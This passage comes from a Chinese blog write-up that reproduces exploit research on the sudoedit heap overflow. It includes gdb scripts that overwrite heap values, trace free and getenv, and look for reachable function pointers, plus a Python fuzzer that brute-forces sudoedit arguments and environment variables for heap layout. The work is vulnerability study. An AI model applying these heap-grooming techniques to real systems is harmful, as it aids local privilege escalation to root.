<p>能堆溢出的堆在最下面，不能覆写任何函数指针，艹</p>
</li>
<li>
<p>重新分析，判断找到的函数是否真的被执行了，作者这里修改了他的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">0x41</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(heap), <span class="number">8</span>):</span><br><span class="line">    heap_addr = i+<span class="number">0x005555555f9000</span></span><br><span class="line">    b = heap[i:i+<span class="number">8</span>]</span><br><span class="line">    q = struct.unpack(<span class="string">&#x27;Q&#x27;</span>, b)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mem <span class="keyword">in</span> memmap:</span><br><span class="line">        <span class="keyword">if</span> q&gt;=mem[<span class="number">0</span>] <span class="keyword">and</span> q&lt;=mem[<span class="number">1</span>]:</span><br><span class="line">            <span class="comment"># print(f&quot;0x&#123;heap_addr:016x&#125;: &#123;q:016x&#125; &#123;b&#125;&quot;)</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;set *0x<span class="subst">&#123;heap_addr:016x&#125;</span> = 0x&quot;</span>+(<span class="built_in">hex</span>(n)[<span class="number">2</span>:]*<span class="number">5</span>))</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0x000055555561b4d0</span> == heap_addr:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;0x<span class="subst">&#123;heap_addr:016x&#125;</span>: our [buffer]&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>生成不会造成<code>crash</code>的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -en &quot;0edit\x00-s\x000000000&quot; &gt; /tmp/normal</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f75b0c385d066b7147fb7d12818f4fbf.png" alt="image-20220414092905786" /></p>
<p>在gdb中设置这些值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">set *0x00005555556149a8 = 0x4141414141</span><br><span class="line">set *0x00005555556149b0 = 0x4242424242</span><br><span class="line">set *0x0000555555615260 = 0x4343434343</span><br><span class="line">set *0x0000555555615268 = 0x4444444444</span><br><span class="line">set *0x0000555555617e00 = 0x4545454545</span><br><span class="line">set *0x0000555555617eb0 = 0x4646464646</span><br><span class="line">set *0x0000555555618378 = 0x4747474747</span><br><span class="line">set *0x0000555555618398 = 0x4848484848</span><br><span class="line">set *0x00005555556183b8 = 0x4949494949</span><br><span class="line">set *0x00005555556183d8 = 0x4a4a4a4a4a</span><br><span class="line">set *0x00005555556184d8 = 0x4b4b4b4b4b</span><br><span class="line">set *0x0000555555619b40 = 0x4c4c4c4c4c</span><br><span class="line">set *0x000055555561a0b0 = 0x4d4d4d4d4d</span><br></pre></td></tr></table></figure>
<p>取消断点继续，应该就会出现一些报错了</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1f7019cfc44dd23bc8341b49638dfff1.png" alt="image-20220414103302900" /></p>
<p>&gt;&gt;问题</p>
<ul>
<li>
<p>没有出现报错，并且直接执行了</p>
<p>脚本的相关的地址写错了</p>
</li>
</ul>
<p>发现一个红黑树!</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/d2970fcab1ca82e6035b8dc63f429930.png" alt="image-20220414103855166" /></p>
<p>结果看到<code>compar</code>变量被我们覆盖了，说明函数真的被调用了，如果我们能覆盖<code>compar</code>地址，那么就能改写函数指针。重复这些过程就可以找到更多的函数指针。比如修改输入类型，然后把输入换成普通输入，<code>set *0x000055555561a0b0 = 0x4d4d4d4d4d</code>换掉，得到另一个crash</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/8f92f140a02788a9be9ae451e5e482b2.png" alt="image-20220415105540238" /></p>
</li>
</ol>
<h1 id="强制堆分配"><a class="markdownIt-Anchor" href="#强制堆分配"></a> 强制堆分配</h1>
<p>在上一节中，能溢出的buffer位于最底层，不能更改能被使用的函数指针，所以尝试暴力取溢出长度，看看能不能分配到上面一点的位置。</p>
<p>核心思想是随机输入到sudoedit，然后调用上节找到的函数时，打印该函数指针和打印堆溢出的chunk</p>
<h2 id="改写sudo源码"><a class="markdownIt-Anchor" href="#改写sudo源码"></a> 改写sudo源码</h2>
<p>真实环境下的sudo和测试下的sudo是两个二进制文件，为了贴近正式的环境，要尽量的贴近真实情况下的sudo</p>
<ol>
<li>
<p>添加打印参数Chunk地址</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2cef5162ba6a14905755f21063a29737.png" alt="image-20220414120240051" /></p>
</li>
<li>
<p>已上一节的红黑树为例，打印<code>compar</code>的值</p>
<p><s>忘写分号了</s></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/0277679ee8b79157542b7ca86679262e.png" alt="image-20220414122222094" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/677cba2f8962fddb6943fa56da03b8d1.png" alt="image-20220414122448875" /></p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure &amp;&amp; make</span><br><span class="line">ln -s /pwd/sudo_test/src/.libs/sudo ./src/.libs/sudoedit</span><br></pre></td></tr></table></figure>
<p>作者在这里踩了坑，我想复现下，不想看的可以略过</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/4ecd2bb3d6b06eefcd140b1cbc096af3.png" alt="image-20220414123642675" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/cc0e7e9154dd2ed5e98aae914cc289f4.png" alt="image-20220414123801800" /></p>
<p>虽然报错的方式不一样，但是结果和原因都是一样的。一个都是libsudo这个库找不到，作者的问题是使用的是系统变量中的库，<strong>但是这个库不含有<code>printf</code>即其他输出，自然也就没法打印字符串</strong></p>
<p>&gt;&gt;问题</p>
<ul>
<li>
<p>没有反应</p>
<p>找找是不是代码写的文件是其他文件的代码</p>
</li>
</ul>
<p>所以使用<code>make install</code>安装方法就好了，只要之前make过一次之后就都可以了</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a9391826eb45d490d44f3519b94854f8.png" alt="image-20220414212057228" /></p>
<p>堆溢出发生时，程序并不会立即<code>crash</code>，而是会进入到红黑树的部分，但是能溢出的<code>user_args</code>地址在<code>rbtree1</code>地址后面，所以依然无法利用</p>
<h2 id="暴力测试脚本"><a class="markdownIt-Anchor" href="#暴力测试脚本"></a> 暴力测试脚本</h2>
<p>尝试构造不同的输入，看看能不能有路径可以把函数指针放在我们能溢出的chunk后面的</p>
<ol>
<li>
<p>输入来源</p>
<ul>
<li>stdin</li>
<li>文件(files)</li>
<li>协议参数(arguments)</li>
<li>环境变量(env vars)</li>
</ul>
</li>
<li>
<p>设置长度</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># define some common size values usable for different inputs</span></span><br><span class="line">_SIZES = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>)]</span><br><span class="line">_SIZES += [<span class="number">2</span>**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">15</span>)]</span><br><span class="line">_SIZES += [(<span class="number">2</span>**i)+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">15</span>)]</span><br><span class="line">_SIZES += [(<span class="number">2</span>**i)-<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">15</span>)]</span><br><span class="line">_SIZES += ([<span class="number">0</span>]*<span class="number">50</span>)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>sudo参数协议(sudo help)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># define some flags from sudo -h</span></span><br><span class="line">ARG1 = [<span class="string">&quot;-A&quot;</span>,<span class="string">&quot;-B&quot;</span>,<span class="string">&quot;-E&quot;</span>,<span class="string">&quot;-e&quot;</span>,<span class="string">&quot;-H&quot;</span>,<span class="string">&quot;-K&quot;</span>,<span class="string">&quot;-k&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;-n&quot;</span>,<span class="string">&quot;-P&quot;</span>,<span class="string">&quot;-S&quot;</span>,<span class="string">&quot;-s&quot;</span>]</span><br><span class="line">ARG1 += [<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">ARG2 = _SIZES</span><br><span class="line">ARG3 = _SIZES</span><br><span class="line">HOSTNAME = _SIZES</span><br><span class="line">ENV = _SIZES</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>设置测试集</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dump a testcase into a logfile</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_file</span>(<span class="params">fname, lines, ptrs, arg, env, key</span>):</span><br><span class="line">    <span class="comment"># create the folders if they don&#x27;t exist</span></span><br><span class="line">    directory = os.path.dirname(fname)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(directory):</span><br><span class="line">        os.makedirs(directory)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># don&#x27;t write the dump file if it&#x27;s already too large</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(fname) <span class="keyword">and</span> Path(fname).stat().st_size &gt; <span class="number">200000</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># write to file</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(fname, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;----------------------------\n&quot;</span>)</span><br><span class="line">        f.write(lines[<span class="number">1</span>].decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> key:</span><br><span class="line">            distance = ptrs[key] - ptrs[<span class="string">b&#x27;user_args&#x27;</span>]</span><br><span class="line">            f.write(<span class="string">f&quot;user_args &lt; <span class="subst">&#123;key.decode(<span class="string">&#x27;ascii&#x27;</span>)&#125;</span>\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">f&quot;distance: 0x<span class="subst">&#123;distance:x&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> key:</span><br><span class="line">            f.write(<span class="string">f&quot;0x<span class="subst">&#123;ptrs[<span class="string">b&#x27;user_args&#x27;</span>]:016x&#125;</span> &lt; 0x<span class="subst">&#123;ptrs[key]:016x&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;args: sudoedit &quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot; &quot;</span>.join(arg))</span><br><span class="line">        f.write(<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> env:</span><br><span class="line">            f.write(<span class="string">f&quot;<span class="subst">&#123;k&#125;</span>=<span class="subst">&#123;env[k]&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.write(lines[<span class="number">0</span>].decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        test = &#123;&#125;</span><br><span class="line">        test[<span class="string">&#x27;arg&#x27;</span>] = arg</span><br><span class="line">        test[<span class="string">&#x27;env&#x27;</span>] = env</span><br><span class="line">        f.write(json.dumps(test))</span><br><span class="line">        f.write(<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># this will run sudoedit with a set of arguments and environment variables</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_sudoedit</span>(<span class="params">arg, env</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------------&quot;</span>)</span><br><span class="line">    <span class="comment"># disable stdout buffering with stdbuf wrapping around sudoedit</span></span><br><span class="line">    <span class="comment"># and add the commandline arguments</span></span><br><span class="line">    _cmd = [<span class="string">&quot;/usr/bin/stdbuf&quot;</span>, <span class="string">&quot;-o0&quot;</span>, <span class="string">&quot;/usr/local/bin/sudoedit&quot;</span>] + arg</span><br><span class="line"></span><br><span class="line">    <span class="comment"># execute it</span></span><br><span class="line">    p = subprocess.Popen(_cmd, env=env, bufsize=<span class="number">0</span>, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># send some newlines and check if we get any output</span></span><br><span class="line">        lines = p.communicate(<span class="string">b&quot;x\nx\nx\nx\n&quot;</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        <span class="comment"># terminate on timeout</span></span><br><span class="line">        p.terminate()</span><br><span class="line">        lines = p.communicate()</span><br><span class="line">    <span class="keyword">if</span> p.returncode == -<span class="number">11</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;SEGFAULT&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># read the list of function pointers</span></span><br><span class="line">    ptrs = &#123;&#125;</span><br><span class="line">    skipping = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">0</span>].splitlines():</span><br><span class="line">        key,val = line.split(<span class="string">b&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">b&#x27;user_args&#x27;</span>:</span><br><span class="line">            skipping = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> skipping:</span><br><span class="line">            ptrs[key] = <span class="built_in">int</span>(val,<span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># go through all function pointers</span></span><br><span class="line">    <span class="keyword">if</span> ptrs <span class="keyword">and</span> <span class="string">b&#x27;user_args&#x27;</span> <span class="keyword">in</span> ptrs:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> ptrs:</span><br><span class="line">            <span class="keyword">if</span> key != <span class="string">b&#x27;user_args&#x27;</span>:</span><br><span class="line">                <span class="comment"># is our overflow buffer before a function pointer?</span></span><br><span class="line">                <span class="keyword">if</span> ptrs[<span class="string">b&#x27;user_args&#x27;</span>] &lt; ptrs[key]:</span><br><span class="line">                    distance = ptrs[key] - ptrs[<span class="string">b&#x27;user_args&#x27;</span>]</span><br><span class="line">                    <span class="keyword">if</span> distance&lt;<span class="number">14000</span>:</span><br><span class="line">                        fname = <span class="string">f&#x27;<span class="subst">&#123;FOLDER&#125;</span>/<span class="subst">&#123;distance&#125;</span>&#x27;</span></span><br><span class="line">                        dump_file(fname, lines, ptrs, arg, env, key)</span><br><span class="line"></span><br><span class="line">                        <span class="comment"># did we get a segfault?</span></span><br><span class="line">                        <span class="keyword">if</span> p.returncode == -<span class="number">11</span>:</span><br><span class="line">                            fname = <span class="string">f&quot;<span class="subst">&#123;FOLDER&#125;</span>/crashes/segfault_<span class="subst">&#123;distance&#125;</span>&quot;</span></span><br><span class="line">                            dump_file(fname, lines, ptrs, arg, env, <span class="literal">None</span>)</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">ALPHABET = <span class="string">&#x27;0123456789ABCDEFGHIKLMNOPQRSTUVWXYZ&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>fuzz主要功能</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fuzz loop</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># select random size values</span></span><br><span class="line">    arg1 = random.choice(ARG1)</span><br><span class="line">    rand_arg2_size = random.choice(ARG2)</span><br><span class="line">    rand_arg3_size = random.choice(ARG3)</span><br><span class="line">    rand_hostname_size = random.choice(HOSTNAME)</span><br><span class="line">    rand_env_size = random.choice(ENV)</span><br><span class="line">    arg = []</span><br><span class="line">    env = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># arguments</span></span><br><span class="line">    <span class="comment"># ... -s AAAAAAA\ ...</span></span><br><span class="line">    <span class="keyword">if</span> arg1:</span><br><span class="line">        arg.append(arg1)</span><br><span class="line">    arg.append(<span class="string">&quot;-s&quot;</span>)</span><br><span class="line">    arg.append(random.choice(ALPHABET)*rand_arg2_size + <span class="string">&quot;\\&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> rand_arg3_size:</span><br><span class="line">        arg.append(random.choice(ALPHABET)*rand_arg3_size)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># environment variables</span></span><br><span class="line">    <span class="keyword">if</span> rand_hostname_size:</span><br><span class="line">        env[<span class="string">&quot;HOSTNAME&quot;</span>] = random.choice(ALPHABET)*rand_hostname_size</span><br><span class="line">    <span class="keyword">if</span> rand_env_size:</span><br><span class="line">        env[random.choice(ALPHABET)*<span class="number">3</span>] = random.choice(ALPHABET)*rand_env_size</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># run sudoedit</span></span><br><span class="line">    run_sudoedit(arg, env)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>开始fuzz</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># this will run sudoedit with a set of arguments and environment variables</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_sudoedit</span>(<span class="params">arg, env</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------------&quot;</span>)</span><br><span class="line">    <span class="comment"># disable stdout buffering with stdbuf wrapping around sudoedit</span></span><br><span class="line">    <span class="comment"># and add the commandline arguments</span></span><br><span class="line">    _cmd = [<span class="string">&quot;/usr/bin/stdbuf&quot;</span>, <span class="string">&quot;-o0&quot;</span>, <span class="string">&quot;/usr/local/bin/sudoedit&quot;</span>] + arg</span><br><span class="line"></span><br><span class="line">    <span class="comment"># execute it</span></span><br><span class="line">    p = subprocess.Popen(_cmd, env=env, bufsize=<span class="number">0</span>, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># send some newlines and check if we get any output</span></span><br><span class="line">        lines = p.communicate(<span class="string">b&quot;x\nx\nx\nx\n&quot;</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        <span class="comment"># terminate on timeout</span></span><br><span class="line">        p.terminate()</span><br><span class="line">        lines = p.communicate()</span><br><span class="line">    <span class="keyword">if</span> p.returncode == -<span class="number">11</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;SEGFAULT&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># read the list of function pointers</span></span><br><span class="line">    ptrs = &#123;&#125;</span><br><span class="line">    skipping = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">0</span>].splitlines():</span><br><span class="line">        key,val = line.split(<span class="string">b&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">b&#x27;user_args&#x27;</span>:</span><br><span class="line">            skipping = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> skipping:</span><br><span class="line">            ptrs[key] = <span class="built_in">int</span>(val,<span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># go through all function pointers</span></span><br><span class="line">    <span class="keyword">if</span> ptrs <span class="keyword">and</span> <span class="string">b&#x27;user_args&#x27;</span> <span class="keyword">in</span> ptrs:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> ptrs:</span><br><span class="line">            <span class="keyword">if</span> key != <span class="string">b&#x27;user_args&#x27;</span>:</span><br><span class="line">                <span class="comment"># is our overflow buffer before a function pointer?</span></span><br><span class="line">                <span class="keyword">if</span> ptrs[<span class="string">b&#x27;user_args&#x27;</span>] &lt; ptrs[key]:</span><br><span class="line">                    distance = ptrs[key] - ptrs[<span class="string">b&#x27;user_args&#x27;</span>]</span><br><span class="line">                    <span class="keyword">if</span> distance&lt;<span class="number">14000</span>:</span><br><span class="line">                        fname = <span class="string">f&#x27;<span class="subst">&#123;FOLDER&#125;</span>/<span class="subst">&#123;distance&#125;</span>&#x27;</span></span><br><span class="line">                        dump_file(fname, lines, ptrs, arg, env, key)</span><br><span class="line"></span><br><span class="line">                        <span class="comment"># did we get a segfault?</span></span><br><span class="line">                        <span class="keyword">if</span> p.returncode == -<span class="number">11</span>:</span><br><span class="line">                            fname = <span class="string">f&quot;<span class="subst">&#123;FOLDER&#125;</span>/crashes/segfault_<span class="subst">&#123;distance&#125;</span>&quot;</span></span><br><span class="line">                            dump_file(fname, lines, ptrs, arg, env, <span class="literal">None</span>)</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line">                        <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/8415ea76e1d7d757ab5a0a2a64b55aa8.png" alt="image-20220415130840543" /></p>
<p>最后发现chunk位置相差太远不同 ，根本无法利用</p>
<h1 id="gdb工具编写"><a class="markdownIt-Anchor" href="#gdb工具编写"></a> GDB工具编写</h1>
<h2 id="阶段-1"><a class="markdownIt-Anchor" href="#阶段-1"></a> 阶段 1</h2>
<p>要改进上面的暴力脚本，就要知道我对的分配情况，我们也可以在gdb里面在每次<code>malloc</code>下断点查看<code>size</code>参数。</p>
<p>更为便捷的技巧是查看<code>free</code>时候的指针的地址的值，如果是我们认识的字符串，那么我们就能控制到哪里</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> breakpoint pending on</span><br><span class="line"><span class="built_in">break</span> free</span><br><span class="line">commands</span><br><span class="line"> silent</span><br><span class="line"> <span class="built_in">printf</span> <span class="string">&quot;free(): %s\n&quot;</span>,<span class="variable">$rdi</span></span><br><span class="line"> <span class="built_in">continue</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">run -s <span class="string">&#x27;SSSSSSSSSSSSSSSSSSSSSYYY\&#x27;</span></span><br></pre></td></tr></table></figure>
<p>运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -x ./gdb.init /usr/local/bin/sudoedit  &gt; free_trace</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/087221d78d84e19ddbcfe7d6a788fbfc.png" alt="image-20220415123301007" /></p>
<p>发现有环境变量，再次尝试设置环境变量</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/19f25365a5ccc6c30832bb70793e9ff3.png" alt="image-20220415123740168" /></p>
<p>发现根本没变，要是我们尝试更多的环境变量呢？</p>
<h2 id="阶段-2"><a class="markdownIt-Anchor" href="#阶段-2"></a> 阶段 2</h2>
<p>直接在加载环境变量（<code>getenv(3p)</code>）的时候下断点，看看用了那些</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">set breakpoint pending on</span><br><span class="line"></span><br><span class="line">break getenv</span><br><span class="line">commands</span><br><span class="line"> silent</span><br><span class="line"> printf &quot;getenv(): %s\n&quot;,$rdi</span><br><span class="line"> continue</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">run -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\&#x27;</span><br></pre></td></tr></table></figure>
<p>发现可以设置的环境变量值</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/dc45f29e3991c2d964986b846b522f9c.png" alt="image-20220415124335590" /></p>
<p>再次改写脚本</p>
